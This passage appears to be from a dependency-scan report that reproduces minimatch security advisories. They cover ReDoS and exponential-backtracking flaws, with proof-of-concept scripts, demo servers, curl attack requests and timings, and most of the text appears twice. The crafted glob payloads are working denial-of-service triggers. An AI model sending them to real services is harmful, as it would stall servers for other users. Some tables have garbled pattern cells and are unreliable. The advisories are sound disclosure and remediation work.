- Escalate impact depending on deployment context (keys, configs, scripts, app data).

**minimatch** `3.1.2` (npm)

`pkg:npm/minimatch@3.1.2`

*Inefficient Regular Expression Complexity*


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `<3.1.3`                                                          |
| Fixed version   | `10.2.1`                                                          |
| CVSS Score      | `8.7`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| EPSS Score      | `0.025%`                                                          |
| EPSS Percentile | `7th percentile`                                                  |


Description



### Summary

`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.

The time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.

### Details

*Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.*

### PoC

When minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X`*:

```
/^(?!\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/
```

When the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.

### Impact

Any application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:

- File search/filter UIs that accept glob patterns
- `.gitignore`-style filtering with user-defined rules
- Build tools that accept glob configuration
- Any API that exposes glob matching to untrusted input

---

Thanks to @ljharb for back-porting the fix to legacy versions of minimatch.

*Inefficient Regular Expression Complexity*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<3.1.4`                                       |
| Fixed version   | `3.1.4`                                        |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.018%`                                       |
| EPSS Percentile | `5th percentile`                               |


Description



### Summary

Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)`_), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `_(_(_(a|b)))`and an 18-byte non-matching input,`minimatch()`stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default`minimatch()`API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects`+()` extglobs equally.

---

### Details

The root cause is in `AST.toRegExpSource()` at `[src/ast.ts#L598](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598)`. For the `*` extglob type, the close token emitted is `)`* or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:

```typescript
: this.type === '*' && bodyDotAllowed ? `)?`
: `)${this.type}`
```

This produces the following regexps:

| Pattern    | Generated regex |
| ---------- | --------------- | ---------------- | ------------ |
| `\*(a      | b)`             | `/^(?:a          | b)\*$/`      |
| `_(_(a     | b))`            | `/^(?:(?:a       | b)_)_$/`     |
| `_(_(\*(a  | b)))`           | `/^(?:(?:(?:a    | b)_)_)\*$/`  |
| `_(_(_(_(a | b))))`          | `/^(?:(?:(?:(?:a | b)_)_)_)_$/` |

These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.

The generated regex is stored on `this.set` and evaluated inside `matchOne()` at `[src/index.ts#L1010](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010)` via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.

Measured times via `minimatch()`:

| Pattern    | Input  | Time          |
| ---------- | ------ | ------------- | ---------- |
| `_(_(a     | b))`   | `a` x30 + `z` | ~68,000ms  |
| `_(_(\*(a  | b)))`  | `a` x20 + `z` | ~124,000ms |
| `_(_(_(_(a | b))))` | `a` x25 + `z` | ~116,000ms |
| `\*(a      | a)`    | `a` x25 + `z` | ~2,000ms   |

Depth inflection at fixed input `a` x16 + `z`:

| Depth | Pattern    | Time   |
| ----- | ---------- | ------ | --------- |
| 1     | `\*(a      | b)`    | 0ms       |
| 2     | `_(_(a     | b))`   | 4ms       |
| 3     | `_(_(\*(a  | b)))`  | 270ms     |
| 4     | `_(_(_(_(a | b))))` | 115,000ms |

Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.

---

### PoC

Tested on [minimatch@10.2.2](mailto:minimatch@10.2.2), Node.js 20.

**Step 1 -- verify the generated regexps and timing (standalone script)**

Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:

```javascript
import { minimatch, Minimatch } from 'minimatch';

function timed(fn) {
  const s = process.hrtime.bigint();
  let result, error;
  try {
    result = fn();
  } catch (e) {
    error = e;
  }
  const ms = Number(process.hrtime.bigint() - s) / 1e6;
  return { ms, result, error };
}

// Verify generated regexps
for (let depth = 1; depth <= 4; depth++) {
  let pat = 'a|b';
  for (let i = 0; i < depth; i++) pat = `*(${pat})`;
  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString();
  console.log(`depth=${depth} "${pat}" -> ${re}`);
}
// depth=1 "*(a|b)"          -> /^(?:a|b)*$/
// depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
// depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
// depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/

// Safe-length timing (exponential growth confirmation without multi-minute hang)
const cases = [
  ['*(*(*(a|b)))', 15], // ~270ms
  ['*(*(*(a|b)))', 17], // ~800ms
  ['*(*(*(a|b)))', 19], // ~2400ms
  ['*(*(a|b))', 23], // ~260ms
  ['*(a|b)', 101], // <5ms (depth=1 control)
];
for (const [pat, n] of cases) {
  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat));
  console.log(`"${pat}" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`);
}

// Confirm noext disables the vulnerability
const t_noext = timed(() =>
  minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }),
);
console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`);

// +() is equally affected
const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'));
console.log(
  `"+(+(+(a|b)))" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`,
);
```

Observed output:

```
depth=1 "*(a|b)"          -> /^(?:a|b)*$/
depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/
"*(*(*(a|b)))" n=15: 269ms result=false
"*(*(*(a|b)))" n=17: 268ms result=false
"*(*(*(a|b)))" n=19: 2408ms result=false
"*(*(a|b))"    n=23: 257ms result=false
"*(a|b)"       n=101: 0ms result=false
noext=true: 0ms (should be ~0ms)
"+(+(+(a|b)))" n=18: 6300ms result=false
```

**Step 2 -- HTTP server (event loop starvation proof)**

Save as `poc4-server.mjs`:

```javascript
import http from 'node:http';
import { URL } from 'node:url';
import { minimatch } from 'minimatch';

const PORT = 3001;
http
  .createServer((req, res) => {
    const url = new URL(req.url, `http://localhost:${PORT}`);
    const pattern = url.searchParams.get('pattern') ?? '';
    const path = url.searchParams.get('path') ?? '';

    const start = process.hrtime.bigint();
    const result = minimatch(path, pattern);
    const ms = Number(process.hrtime.bigint() - start) / 1e6;

    console.log(
      `[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern="${pattern}" path="${path.slice(0, 30)}"`,
    );
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n');
  })
  .listen(PORT, () => console.log(`listening on ${PORT}`));
```

Terminal 1 -- start the server:

```
node poc4-server.mjs
```

Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:

```
curl "http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz" &
```

Terminal 3 -- send a benign request while the attack is in-flight:

```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz"
```

**Observed output -- Terminal 2 (attack):**

```
{"result":false,"ms":"64149"}
```

**Observed output -- Terminal 3 (benign, concurrent):**

```
{"result":false,"ms":"0"}

time_total: 63.022047s
```

**Terminal 1 (server log):**

```
[2026-02-20T09:41:17.624Z] pattern="*(*(*(a|b)))" path="aaaaaaaaaaaaaaaaaaaz"
[2026-02-20T09:42:21.775Z] done in 64149ms result=false
[2026-02-20T09:42:21.779Z] pattern="*(a|b)" path="aaaz"
[2026-02-20T09:42:21.779Z] done in 0ms result=false
```

The server reports `"ms":"0"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.

Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.

---

### Impact

Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.

Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.

`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).

**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.

*Inefficient Algorithmic Complexity*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `<3.1.3`                                       |
| Fixed version   | `3.1.3`                                        |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.020%`                                       |
| EPSS Percentile | `5th percentile`                               |


Description



### Summary

`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `*` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.

---

### Details

The vulnerable loop is in `matchOne()` at `[src/index.ts#L960](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960)`:

```typescript
while (fr < fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
```

When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).

There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.

Measured timing with n=30 path segments:


| k (globstars) | Pattern size | Time   |
| ------------- | ------------ | ------ |
| 7             | 36 bytes     | ~154ms |
| 9             | 46 bytes     | ~1.2s  |
| 11            | 56 bytes     | ~5.4s  |
| 12            | 61 bytes     | ~9.7s  |
| 13            | 66 bytes     | ~15.9s |


---

### PoC

Tested on [minimatch@10.2.2](mailto:minimatch@10.2.2), Node.js 20.

**Step 1 -- inline script**

```javascript
import { minimatch } from 'minimatch';

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b';
const path = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a';

const start = Date.now();
minimatch(path, pattern);
console.log(Date.now() - start + 'ms'); // ~1200ms
```

To scale the effect, increase k:

```javascript
// k=11 -> ~5.4s, k=13 -> ~15.9s
const k = 11;
const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b';
const path = Array(30).fill('a').join('/');
minimatch(path, pattern);
```

No special options are required. This reproduces with the default `minimatch()` call.

**Step 2 -- HTTP server (event loop starvation proof)**

The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:

```javascript
// poc1-server.mjs
import http from 'node:http';
import { URL } from 'node:url';
import { minimatch } from 'minimatch';

const PORT = 3000;

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  if (url.pathname !== '/match') {
    res.writeHead(404);
    res.end();
    return;
  }

  const pattern = url.searchParams.get('pattern') ?? '';
  const path = url.searchParams.get('path') ?? '';

  const start = process.hrtime.bigint();
  const result = minimatch(path, pattern);
  const ms = Number(process.hrtime.bigint() - start) / 1e6;

  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n');
});

server.listen(PORT);
```

Terminal 1 -- start the server:

```
node poc1-server.mjs
```

Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:

```
curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &
```

Terminal 3 -- while the attack is in-flight, send a benign request:

```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"
```

**Observed output (Terminal 3):**

```
{"result":true,"ms":"0"}

time_total: 4.132709s
```

The server reports `"ms":"0"` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:

```
{"result":true,"ms":"0"}

time_total: 0.001599s
```

---

### Impact

Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.

**minimatch** `9.0.5` (npm)

`pkg:npm/minimatch@9.0.5`

*Inefficient Regular Expression Complexity*


|                 |                                                                   |
| --------------- | ----------------------------------------------------------------- |
| Affected range  | `>=9.0.0` `<9.0.6`                                                |
| Fixed version   | `10.2.1`                                                          |
| CVSS Score      | `8.7`                                                             |
| CVSS Vector     | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N` |
| EPSS Score      | `0.025%`                                                          |
| EPSS Percentile | `7th percentile`                                                  |


Description



### Summary

`minimatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when a glob pattern contains many consecutive `*` wildcards followed by a literal character that doesn't appear in the test string. Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits.

The time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever.

### Details

*Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.*

### PoC

When minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X`*:

```
/^(?!\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/
```

When the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential.

### Impact

Any application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes:

- File search/filter UIs that accept glob patterns
- `.gitignore`-style filtering with user-defined rules
- Build tools that accept glob configuration
- Any API that exposes glob matching to untrusted input

---

Thanks to @ljharb for back-porting the fix to legacy versions of minimatch.

*Inefficient Regular Expression Complexity*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=9.0.0` `<9.0.7`                             |
| Fixed version   | `9.0.7`                                        |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.018%`                                       |
| EPSS Percentile | `5th percentile`                               |


Description



### Summary

Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)`_), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `_(_(_(a|b)))`and an 18-byte non-matching input,`minimatch()`stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default`minimatch()`API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects`+()` extglobs equally.

---

### Details

The root cause is in `AST.toRegExpSource()` at `[src/ast.ts#L598](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598)`. For the `*` extglob type, the close token emitted is `)`* or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group:

```typescript
: this.type === '*' && bodyDotAllowed ? `)?`
: `)${this.type}`
```

This produces the following regexps:

| Pattern    | Generated regex |
| ---------- | --------------- | ---------------- | ------------ |
| `\*(a      | b)`             | `/^(?:a          | b)\*$/`      |
| `_(_(a     | b))`            | `/^(?:(?:a       | b)_)_$/`     |
| `_(_(\*(a  | b)))`           | `/^(?:(?:(?:a    | b)_)_)\*$/`  |
| `_(_(_(_(a | b))))`          | `/^(?:(?:(?:(?:a | b)_)_)_)_$/` |

These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`.

The generated regex is stored on `this.set` and evaluated inside `matchOne()` at `[src/index.ts#L1010](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010)` via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration.

Measured times via `minimatch()`:

| Pattern    | Input  | Time          |
| ---------- | ------ | ------------- | ---------- |
| `_(_(a     | b))`   | `a` x30 + `z` | ~68,000ms  |
| `_(_(\*(a  | b)))`  | `a` x20 + `z` | ~124,000ms |
| `_(_(_(_(a | b))))` | `a` x25 + `z` | ~116,000ms |
| `\*(a      | a)`    | `a` x25 + `z` | ~2,000ms   |

Depth inflection at fixed input `a` x16 + `z`:

| Depth | Pattern    | Time   |
| ----- | ---------- | ------ | --------- |
| 1     | `\*(a      | b)`    | 0ms       |
| 2     | `_(_(a     | b))`   | 4ms       |
| 3     | `_(_(\*(a  | b)))`  | 270ms     |
| 4     | `_(_(_(_(a | b))))` | 115,000ms |

Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level.

---

### PoC

Tested on [minimatch@10.2.2](mailto:minimatch@10.2.2), Node.js 20.

**Step 1 -- verify the generated regexps and timing (standalone script)**

Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`:

```javascript
import { minimatch, Minimatch } from 'minimatch';

function timed(fn) {
  const s = process.hrtime.bigint();
  let result, error;
  try {
    result = fn();
  } catch (e) {
    error = e;
  }
  const ms = Number(process.hrtime.bigint() - s) / 1e6;
  return { ms, result, error };
}

// Verify generated regexps
for (let depth = 1; depth <= 4; depth++) {
  let pat = 'a|b';
  for (let i = 0; i < depth; i++) pat = `*(${pat})`;
  const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString();
  console.log(`depth=${depth} "${pat}" -> ${re}`);
}
// depth=1 "*(a|b)"          -> /^(?:a|b)*$/
// depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
// depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
// depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/

// Safe-length timing (exponential growth confirmation without multi-minute hang)
const cases = [
  ['*(*(*(a|b)))', 15], // ~270ms
  ['*(*(*(a|b)))', 17], // ~800ms
  ['*(*(*(a|b)))', 19], // ~2400ms
  ['*(*(a|b))', 23], // ~260ms
  ['*(a|b)', 101], // <5ms (depth=1 control)
];
for (const [pat, n] of cases) {
  const t = timed(() => minimatch('a'.repeat(n) + 'z', pat));
  console.log(`"${pat}" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`);
}

// Confirm noext disables the vulnerability
const t_noext = timed(() =>
  minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true }),
);
console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`);

// +() is equally affected
const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))'));
console.log(
  `"+(+(+(a|b)))" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`,
);
```

Observed output:

```
depth=1 "*(a|b)"          -> /^(?:a|b)*$/
depth=2 "*(*(a|b))"       -> /^(?:(?:a|b)*)*$/
depth=3 "*(*(*(a|b)))"    -> /^(?:(?:(?:a|b)*)*)*$/
depth=4 "*(*(*(*(a|b))))" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/
"*(*(*(a|b)))" n=15: 269ms result=false
"*(*(*(a|b)))" n=17: 268ms result=false
"*(*(*(a|b)))" n=19: 2408ms result=false
"*(*(a|b))"    n=23: 257ms result=false
"*(a|b)"       n=101: 0ms result=false
noext=true: 0ms (should be ~0ms)
"+(+(+(a|b)))" n=18: 6300ms result=false
```

**Step 2 -- HTTP server (event loop starvation proof)**

Save as `poc4-server.mjs`:

```javascript
import http from 'node:http';
import { URL } from 'node:url';
import { minimatch } from 'minimatch';

const PORT = 3001;
http
  .createServer((req, res) => {
    const url = new URL(req.url, `http://localhost:${PORT}`);
    const pattern = url.searchParams.get('pattern') ?? '';
    const path = url.searchParams.get('path') ?? '';

    const start = process.hrtime.bigint();
    const result = minimatch(path, pattern);
    const ms = Number(process.hrtime.bigint() - start) / 1e6;

    console.log(
      `[${new Date().toISOString()}] ${ms.toFixed(0)}ms pattern="${pattern}" path="${path.slice(0, 30)}"`,
    );
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n');
  })
  .listen(PORT, () => console.log(`listening on ${PORT}`));
```

Terminal 1 -- start the server:

```
node poc4-server.mjs
```

Terminal 2 -- fire the attack (depth=3, 19 a's + z) and return immediately:

```
curl "http://localhost:3001/match?pattern=*%28*%28*%28a%7Cb%29%29%29&path=aaaaaaaaaaaaaaaaaaaz" &
```

Terminal 3 -- send a benign request while the attack is in-flight:

```
curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3001/match?pattern=*%28a%7Cb%29&path=aaaz"
```

**Observed output -- Terminal 2 (attack):**

```
{"result":false,"ms":"64149"}
```

**Observed output -- Terminal 3 (benign, concurrent):**

```
{"result":false,"ms":"0"}

time_total: 63.022047s
```

**Terminal 1 (server log):**

```
[2026-02-20T09:41:17.624Z] pattern="*(*(*(a|b)))" path="aaaaaaaaaaaaaaaaaaaz"
[2026-02-20T09:42:21.775Z] done in 64149ms result=false
[2026-02-20T09:42:21.779Z] pattern="*(a|b)" path="aaaz"
[2026-02-20T09:42:21.779Z] done in 0ms result=false
```

The server reports `"ms":"0"` for the benign request -- the legitimate request itself requires no CPU time. The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps.

Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact.

---

### Impact

Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here.

Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard.

`+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed).

**Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.

*Inefficient Algorithmic Complexity*


|                 |                                                |
| --------------- | ---------------------------------------------- |
| Affected range  | `>=9.0.0` `<9.0.7`                             |
| Fixed version   | `9.0.7`                                        |
| CVSS Score      | `7.5`                                          |
| CVSS Vector     | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| EPSS Score      | `0.020%`                                       |
| EPSS Percentile | `5th percentile`                               |


Description



### Summary

`matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `*` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.

---

### Details

The vulnerable loop is in `matchOne()` at `[src/index.ts#L960](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960)`:

```typescript
while (fr < fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
```

When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).

There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input.

Measured timing with n=30 path segments:


| k (globstars) | Pattern size | Time   |
| ------------- | ------------ | ------ |
| 7             | 36 bytes     | ~154ms |
| 9             | 46 bytes     | ~1.2s  |
| 11            | 56 bytes     | ~5.4s  |
| 12            | 61 bytes     | ~9.7s  |
| 13            | 66 bytes     | ~15.9s |


---

### PoC

Tested on [minimatch@10.2.2](mailto:minimatch@10.2.2), Node.js 20.

**Step 1 -- inline script**

```javascript
import { minimatch } from 'minimatch';

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b';
const path = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a';

const start = Date.now();
minimatch(path, pattern);
console.log(Date.now() - start + 'ms'); // ~1200ms
```

To scale the effect, increase k:

```javascript
// k=11 -> ~5.4s, k=13 -> ~15.9s
const k = 11;
const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b';
const path = Array(30).fill('a').join('/');
minimatch(path, pattern);
```

No special options are required. This reproduces with the default `minimatch()` call.

**Step 2 -- HTTP server (event loop starvation proof)**

The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:

```javascript
// poc1-server.mjs
import http from 'node:http';
import { URL } from 'node:url';
import { minimatch } from 'minimatch';

const PORT = 3000;

const server = http.createServer((req, res) => {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  if (url.pathname !== '/match') {
    res.writeHead(404);
    res.end();
    return;
  }

  const pattern = url.searchParams.get('pattern') ?? '';
  const path = url.searchParams.get('path') ?? '';

  const start = process.hrtime.bigint();
  const result = minimatch(path, pattern);
  const ms = Number(process.hrtime.bigint() - start) / 1e6;

  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n');
});

server.listen(PORT);
```

Terminal 1 -- start the server:

```
node poc1-server.mjs
```

Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:

```
